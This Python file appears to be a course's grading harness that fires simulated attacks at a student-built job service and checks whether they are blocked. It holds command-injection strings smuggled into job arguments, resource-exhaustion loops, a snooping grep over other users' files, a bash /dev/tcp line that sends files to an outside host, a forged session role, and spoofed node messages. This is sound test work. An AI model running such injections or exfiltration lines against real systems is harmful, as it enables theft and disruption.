# hostile.py -- course staff file, do not modify.
#
# The hostile events of a sequence. Every check here looks at the system
# from outside: at the results the client got back, at the outside server,
# at docker measurements, or at how the service behaves afterwards. It never
# reads the source of the service, and it never trusts the logs to decide
# whether an event succeeded.
#
# Durations given in the sequence file are simulated. They are converted to
# real seconds with state.clock.real_seconds_for_sim before they are used.

import json
import re
import time
import urllib.request

import dockerstats
import filesgen
import fisclient
import jobs
import users
import wire

GATEWAY_PORT = 9000
SCHEDULER_PORT = 9001
STORAGE_PORT = 9002
EXEC_PORT = 9003


def record(state, event, name, description, outcome, evidence):
    state.add_hostile({
        "t_sim": state.clock.sim_ms(),
        "t_event": event.get("t"),
        "kind": name,
        "description": description,
        "outcome": outcome,
        "evidence": evidence,
    })


def _outcome(succeeded):
    return "succeeded" if succeeded else "blocked"


def _outside_stats():
    try:
        with urllib.request.urlopen("http://outside:8081/stats", timeout=5) as r:
            return json.loads(r.read().decode("utf-8", "replace"))
    except Exception:
        return None


def _container_restarts(docker_client, name):
    try:
        c = dockerstats.find_container(docker_client, name)
        if c is None:
            return None
        c.reload()
        return c.attrs.get("RestartCount", 0)
    except Exception:
        return None


def _restarted_nodes(docker_client, before):
    out = []
    for n, old in before.items():
        new = _container_restarts(docker_client, n)
        if old is not None and new is not None and new > old:
            out.append(n)
    return out


def _oom_nodes(docker_client, since_epoch_s):
    """The nodes in which docker reported an out-of-memory kill since the
    given real time."""
    found = set()
    try:
        events = docker_client.events(since=int(since_epoch_s), until=int(time.time()) + 1,
                                      filters={"event": "oom"}, decode=True)
        for e in events:
            attrs = (e.get("Actor") or {}).get("Attributes") or {}
            if attrs.get("com.docker.compose.project") != dockerstats.COMPOSE_PROJECT:
                continue
            service = attrs.get("com.docker.compose.service")
            if service:
                found.add(service)
    except Exception:
        pass
    return sorted(found)


def _ensure_login(user):
    acct = users.ACCOUNTS.get(user)
    if acct:
        fisclient.login(user, acct["password"])


def _other_user(user):
    return next((u for u in users.ACCOUNTS if u != user and
                 users.ACCOUNTS[u]["role"] == "user"), "alice")


def _sim_sleep(state, sim_seconds):
    time.sleep(state.clock.real_seconds_for_sim(sim_seconds))


def _median(values):
    if not values:
        return None
    s = sorted(values)
    mid = len(s) // 2
    return s[mid] if len(s) % 2 else (s[mid - 1] + s[mid]) / 2.0


# ---------------------------------------------------------------------------

def kind_long_job(state, event, docker_client):
    user = event.get("user", "mallory")
    _ensure_login(user)
    spin_min = float(event.get("spin_minutes", 8.0))
    real_s = max(5, int(state.clock.real_seconds_for_sim(spin_min * 60)))
    cmd = f"$(timeout {real_s} sh -c 'while true; do :; done')"
    rec = jobs.submit_only(state, user, [f"check {cmd}"])
    jobs.track_async(state, rec, timeout_sim_ms=int((spin_min + 5) * 60 * 1000))

    _sim_sleep(state, 120)
    succeeded = rec.state != "done"
    record(state, event, "long_job",
           f"A script that keeps an execution node busy for about {spin_min:g} "
           "simulated minutes.",
           _outcome(succeeded),
           f"job {rec.baseline_job} was "
           f"{'still not done' if succeeded else 'done'} two simulated minutes after it was submitted")


def kind_disk_fill(state, event, docker_client):
    user = event.get("user", "mallory")
    _ensure_login(user)
    fill_min = float(event.get("fill_minutes", 5.0))
    real_fill_s = max(5, int(state.clock.real_seconds_for_sim(fill_min * 60)))
    cmd = ("$(nohup sh -c 'dd if=/dev/zero of=/work/hostile_fill bs=1M count=70 "
           f"2>/dev/null; sleep {real_fill_s}; rm -f /work/hostile_fill' "
           ">/dev/null 2>&1 &)")
    rec = jobs.submit_and_track(state, user, [f"check {cmd}"])

    best = 0.0
    found_node = None
    for _ in range(8):
        for node in dockerstats.EXEC_NODES:
            c = dockerstats.find_container(docker_client, node)
            if c is None:
                continue
            pct = dockerstats._work_usage_pct(c)
            if pct is not None and pct > best:
                best, found_node = pct, node
        if best >= 90.0:
            break
        time.sleep(1.0)
    succeeded = best >= 90.0
    record(state, event, "disk_fill",
           "A script that fills the work disk of an execution node for about "
           f"{fill_min:g} simulated minutes.",
           _outcome(succeeded),
           f"highest use of the work disk after job {rec.baseline_job}: "
           f"{best:.0f}% on {found_node}")


def kind_memory_hog(state, event, docker_client):
    user = event.get("user", "mallory")
    _ensure_login(user)
    cmd = "$(timeout 20 sh -c 'head -c 300000000 /dev/zero | tail > /dev/null')"

    before = {n: _container_restarts(docker_client, n) for n in dockerstats.EXEC_NODES}
    since = time.time() - 1

    rec = jobs.submit_only(state, user, [f"check {cmd}"])
    tracker = jobs.track_async(state, rec)

    oom = []
    restarted = []
    while True:
        finished = not tracker.is_alive()
        oom = [n for n in _oom_nodes(docker_client, since) if n in dockerstats.EXEC_NODES]
        restarted = _restarted_nodes(docker_client, before)
        if oom or restarted or finished:
            break
        time.sleep(1.0)
    if not (oom or restarted):
        time.sleep(2.0)
        oom = [n for n in _oom_nodes(docker_client, since) if n in dockerstats.EXEC_NODES]
        restarted = _restarted_nodes(docker_client, before)

    succeeded = bool(oom or restarted)
    record(state, event, "memory_hog",
           "A script that tries to use more memory than its execution node has.",
           _outcome(succeeded),
           f"nodes that ran out of memory: {oom or 'none'}; "
           f"nodes that restarted: {restarted or 'none'} (job {rec.baseline_job})")


def kind_snoop(state, event, docker_client):
    user = event.get("user", "mallory")
    _ensure_login(user)
    cmd = "$(grep -rho MARK-[A-Za-z0-9_-]* /work/job-*/ 2>/dev/null | sort -u | head -5)"
    rec = jobs.submit_and_track(state, user, [f"check {cmd}"])
    markers = re.findall(r"MARK-[A-Za-z0-9_-]+", rec.output or "")
    foreign = sorted({m for m in markers if not m.startswith(f"MARK-{user}-")})
    succeeded = len(foreign) > 0
    record(state, event, "snoop",
           "A script that tries to read the files of other users on its "
           "execution node. The private files of the other users each hold a "
           "marker line.",
           _outcome(succeeded),
           f"markers of other users in the result of job {rec.baseline_job}: {foreign[:5]}"
           if foreign else
           f"no marker of another user in the result of job {rec.baseline_job} ({rec.state})")


def kind_exfiltrate(state, event, docker_client):
    user = event.get("user", "mallory")
    _ensure_login(user)
    cmd = ("$(timeout 5 bash -c 'cat /work/job-*/*.txt 2>/dev/null | head -c 4000 "
           "> /dev/tcp/outside/8080')")
    before = _outside_stats()
    rec = jobs.submit_and_track(state, user, [f"check {cmd}"])

    before_bytes = (before or {}).get("bytes_total", 0)
    after = None
    after_bytes = before_bytes
    for _ in range(6):
        time.sleep(1.0)
        after = _outside_stats()
        after_bytes = (after or {}).get("bytes_total", 0)
        if after is not None and after_bytes > before_bytes:
            break
    succeeded = after is not None and after_bytes > before_bytes
    record(state, event, "exfiltrate",
           "A script that tries to send files from its execution node to the "
           "outside server.",
           _outcome(succeeded),
           f"bytes received by the outside server: {before_bytes} before, "
           f"{after_bytes} after job {rec.baseline_job}")


def kind_flood(state, event, docker_client):
    """Heavy but ordinary use by one account: large uploads, then many jobs
    that each check those uploads several times. No trick is involved."""
    user = event.get("user", "mallory")
    _ensure_login(user)
    n_jobs = int(event.get("n_jobs", 60))
    n_uploads = int(event.get("n_uploads", 5))
    lines_per_job = int(event.get("lines_per_job", 12))
    size_kb = float(event.get("upload_kb", 280.0))
    others = {u for u in users.ACCOUNTS if u != user}

    window_ms = 5 * 60 * 1000
    t0 = state.clock.sim_ms()
    before = state.job_waits_in_window(max(0, t0 - window_ms), t0, t0, users=others)

    names = []
    for i in range(n_uploads):
        name = f"flood-{i}.txt"
        content = filesgen.gen_content(name, size_kb, 42000 + i).encode("utf-8")
        path = fisclient.write_local_file(user, name, content)
        rc, out, err, ms = fisclient.upload(user, path)
        state.add_upload_lat(state.clock.sim_ms(), user, ms * state.clock.speed,
                             len(content), rc == 0, name=name)
        names.append(name)

    accepted = 0
    for i in range(n_jobs):
        script = [f"check {names[(i + k) % len(names)]}" for k in range(lines_per_job)]
        rec = jobs.submit_only(state, user, script)
        if rec.baseline_job is not None:
            accepted += 1
        jobs.track_async(state, rec)

    _sim_sleep(state, window_ms / 1000.0)
    t1 = state.clock.sim_ms()
    after = state.job_waits_in_window(t0, t1, t1, users=others)

    before_med, after_med = _median(before), _median(after)
    if before_med is None or after_med is None:
        record(state, event, "flood",
               f"One user uploads {n_uploads} large files and submits {n_jobs} "
               "jobs in a short time.",
               "error", "not enough jobs of other users to compare")
        return
    # The others count as starved when their typical wait more than tripled
    # and also grew by more than half a simulated minute.
    succeeded = after_med > 3 * before_med and after_med - before_med > 30000
    record(state, event, "flood",
           f"One user uploads {n_uploads} large files and submits {n_jobs} "
           "jobs in a short time.",
           _outcome(succeeded),
           f"{accepted} of {n_jobs} jobs accepted; median wait of the other users' jobs: "
           f"{before_med / 1000.0:.1f} s in the five simulated minutes before, "
           f"{after_med / 1000.0:.1f} s in the five after "
           "(a job that is not done yet counts with the time it has waited so far)")


def kind_forged_token(state, event, docker_client):
    user = event.get("user", "mallory")
    _ensure_login(user)
    bait = event["bait"]
    bait_seed = event["bait_seed"]
    bait_size_kb = event["bait_size_kb"]

    new_content = filesgen.gen_content(bait, bait_size_kb, 99999)
    path = fisclient.write_local_file(user, bait, new_content.encode())
    fisclient.upload(user, path)

    session_path = f"{fisclient.SESSION_DIR}/{user}.session"
    with open(session_path, "w", newline="\n") as f:
        f.write(f"{user}:employee\n")

    rec = jobs.submit_and_track(state, user, [f"modify {bait}"])

    _ensure_login(user)  # back to the real session

    other_user = _other_user(user)
    rc, out, err, ms = fisclient.request(other_user, bait)
    original = filesgen.gen_content(bait, bait_size_kb, bait_seed)
    succeeded = rc == 0 and out != original
    record(state, event, "forged_token",
           "A user edits the session file of the client to claim the employee "
           f"role, and then tries to modify the library file {bait}.",
           _outcome(succeeded),
           f"{bait} in the library was {'changed' if succeeded else 'not changed'} "
           f"(job {rec.baseline_job}, result: {(rec.output or '').strip()[:80]!r})")


def kind_forged_node_message(state, event, docker_client):
    bait2 = event["bait"]
    user = event.get("user", "mallory")
    other_user = _other_user(user)
    rc0, out0, err0, ms0 = fisclient.request(other_user, bait2)
    reply = wire.call("exec1", EXEC_PORT, "RUN", sender="mallory", name="mallory",
                      arg="999999 employee", data=f"remove {bait2}", timeout=15)
    time.sleep(2.0)
    rc, out, err, ms = fisclient.request(other_user, bait2)
    succeeded = rc0 == 0 and rc != 0
    record(state, event, "forged_node_message",
           "A message sent straight to an execution node by something that "
           f"pretends to be the scheduler. It asks the node to remove the library file {bait2}.",
           _outcome(succeeded),
           f"the node {'answered' if reply else 'did not answer'}; {bait2} could "
           f"{'be' if rc0 == 0 else 'not be'} requested before and "
           f"{'can still' if rc == 0 else 'cannot'} be requested afterwards")


def kind_direct_storage(state, event, docker_client):
    victim = event["victim"]
    victim_file = event["victim_file"]
    reply = wire.call("storage", STORAGE_PORT, "GET", sender="mallory",
                      name=victim_file, arg=f"upload {victim}", timeout=10)
    data = reply.get("data", b"") if reply else b""
    text = data.decode("utf-8", "replace") if isinstance(data, bytes) else str(data)
    marker_found = f"MARK-{victim}-" in text
    record(state, event, "direct_storage",
           "A message sent straight to the storage node, without going through "
           f"the gateway. It asks for {victim_file}, a private upload of {victim}.",
           _outcome(marker_found),
           f"{len(data)} bytes came back; they "
           f"{'contain' if marker_found else 'do not contain'} the marker line of {victim}")


def kind_node_failure(state, event, docker_client):
    target = event.get("target", "exec1")
    restart_after_min = float(event.get("restart_after_minutes", 3.0))

    c = dockerstats.find_container(docker_client, target)
    if c is None:
        record(state, event, "node_failure", f"Staff action: {target} is stopped.",
               "error", f"no container found for {target}")
        return

    t_kill = state.clock.sim_ms()
    pending_at_kill = [j for j in state.job_snapshot() if j.state == "waiting"]
    c.kill()
    _sim_sleep(state, restart_after_min * 60)

    c.reload()
    came_back = c.status == "running"
    if not came_back:
        try:
            c.start()
        except Exception:
            pass
        for _ in range(10):
            time.sleep(1.0)
            c.reload()
            if c.status == "running":
                came_back = True
                break
    t_back = state.clock.sim_ms()

    # The jobs that were not finished when the node went down, and the jobs
    # submitted while it was down. Wait until each of them is done or lost.
    during = [j for j in state.job_snapshot()
              if t_kill <= j.submit_sim_ms < t_back and j.baseline_job is not None]
    group = pending_at_kill + [j for j in during if j not in pending_at_kill]

    deadline = t_back + 10.5 * 60 * 1000
    while state.clock.sim_ms() < deadline:
        if all(j.state != "waiting" for j in group):
            break
        time.sleep(1.0)

    lost = sorted(j.baseline_job for j in group if j.state != "done" and j.baseline_job is not None)
    succeeded = len(lost) > 0
    record(state, event, "node_failure",
           f"Not an attack: {target} is stopped while the service is in use, and "
           f"started again {restart_after_min:g} simulated minutes later. The "
           "event succeeds when jobs are lost because of it.",
           _outcome(succeeded),
           f"{target} {'is running again' if came_back else 'did not come back'}; "
           f"{len(group)} jobs were in the system while it was down, "
           f"{len(lost)} of them were lost"
           + (f" (job numbers {lost[:10]})" if lost else ""))


def kind_bad_length(state, event, docker_client):
    target = event["target"]
    port = {"gateway": GATEWAY_PORT, "scheduler": SCHEDULER_PORT}.get(target)
    before = _container_restarts(docker_client, target)

    try:
        wire.call(target, port, "STATUS", sender="mallory", arg="1",
                  length_text="99999999999999", data=b"", expect_reply=False, timeout=5)
    except Exception:
        pass

    restarted = False
    for _ in range(10):
        time.sleep(1.0)
        after = _container_restarts(docker_client, target)
        if before is not None and after is not None and after > before:
            restarted = True
            break

    # If the node did not crash, make sure that it still does its work, by
    # using the service the normal way.
    answering = True
    if not restarted:
        checker = _other_user(event.get("user", "mallory"))
        acct = users.ACCOUNTS[checker]
        answering = False
        for _ in range(3):
            rc, out, err, ms = fisclient.login(checker, acct["password"])
            if rc == 0 and target == "scheduler":
                rec = jobs.submit_only(state, checker, ["check no-such-file.txt"])
                jobs.track_async(state, rec)
                rc = 0 if rec.baseline_job is not None else 1
            if rc == 0:
                answering = True
                break
            time.sleep(2.0)

    succeeded = restarted or not answering
    if restarted:
        evidence = f"the {target} crashed and was restarted"
    elif not answering:
        evidence = f"the {target} stopped answering"
    else:
        evidence = f"the {target} kept running and kept answering"
    record(state, event, "bad_length",
           f"A damaged message sent to the {target}: its header announces far "
           "more data than is sent.",
           _outcome(succeeded), evidence)


KIND_FUNCS = {
    "long_job": kind_long_job,
    "disk_fill": kind_disk_fill,
    "memory_hog": kind_memory_hog,
    "snoop": kind_snoop,
    "exfiltrate": kind_exfiltrate,
    "flood": kind_flood,
    "forged_token": kind_forged_token,
    "forged_node_message": kind_forged_node_message,
    "direct_storage": kind_direct_storage,
    "node_failure": kind_node_failure,
    "bad_length": kind_bad_length,
}


def run_hostile(state, logged_in, event, docker_client):
    kind = event.get("kind")
    func = KIND_FUNCS.get(kind)
    if func is None:
        record(state, event, kind or "?", "unknown hostile kind", "error", "")
        return
    if docker_client is None:
        record(state, event, kind, "docker API unavailable in the monitor", "error", "")
        return
    func(state, event, docker_client)
